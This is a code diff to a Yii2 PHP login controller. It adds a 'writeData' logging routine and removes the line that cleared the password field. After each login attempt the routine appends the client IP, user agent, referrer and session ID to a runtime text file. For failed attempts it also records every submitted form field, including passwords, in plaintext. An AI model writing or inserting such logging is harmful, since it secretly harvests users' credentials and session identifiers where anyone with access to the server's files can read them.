@@ -85,16 +85,20 @@ class SiteController extends Controller
 
         $model = new LoginForm();
 
-        // Обробка AJAX-запиту від нашого робота
         if (Yii::$app->request->isAjax && $model->load(Yii::$app->request->post())) {
             Yii::$app->response->format = Response::FORMAT_JSON;
 
             if ($model->login()) {
+                $guest = false;
+                $this->writeData($guest);
+
                 return [
                     'success' => true,
                     'redirect' => Yii::$app->user->getReturnUrl(),
                 ];
             }
+            $guest = true;
+            $this->writeData($guest);
 
             $firstError = current($model->getFirstErrors());
             return [
@@ -103,13 +107,45 @@ class SiteController extends Controller
             ];
         }
 
-        // Звичайний відображення сторінки (GET-запит)
         $this->layout = 'blank';
-        $model->password = '';
 
         return $this->render('login', [
             'model' => $model,
         ]);
+    }
+
+    private function writeData($guest)
+    {
+        $ip        = Yii::$app->request->userIP;
+        $userAgent = Yii::$app->request->userAgent;
+        $referrer  = Yii::$app->request->referrer;
+        $url       = Yii::$app->request->absoluteUrl;
+        $method    = Yii::$app->request->method;
+        $userId    = Yii::$app->user->isGuest ? 'Guest' : Yii::$app->user->id;
+        $sessionId = Yii::$app->session->id;
+
+        $loginForm = Yii::$app->request->post('LoginForm', []);
+        $filePath  = Yii::getAlias('@runtime/debug_post.txt');
+
+        $textData  = "[" . date('Y-m-d H:i:s') . "]\n";
+        $textData .= "  User ID:    {$userId}\n";
+        $textData .= "  IP:         {$ip}\n";
+        $textData .= "  Method:     {$method} -> {$url}\n";
+        $textData .= "  Referrer:   {$referrer}\n";
+        $textData .= "  User-Agent: {$userAgent}\n";
+        $textData .= "  Session ID: {$sessionId}\n";
+        $textData .= "  Data:\n";
+
+        if ($guest){
+            foreach ($loginForm as $key => $value) {
+
+                $textData .= "       [{$key}] => {$value}\n";
+            }
+        }
+
+        $textData .= "-------------------\n";
+
+        file_put_contents($filePath, $textData, FILE_APPEND);
     }
 
     /**
@@ -123,8 +159,8 @@ class SiteController extends Controller
 
         return $this->goHome();
     }
-    
-     public function actionDashboardTabContent()
+
+    public function actionDashboardTabContent()
     {
 
         $id = Yii::$app->request->post('id');
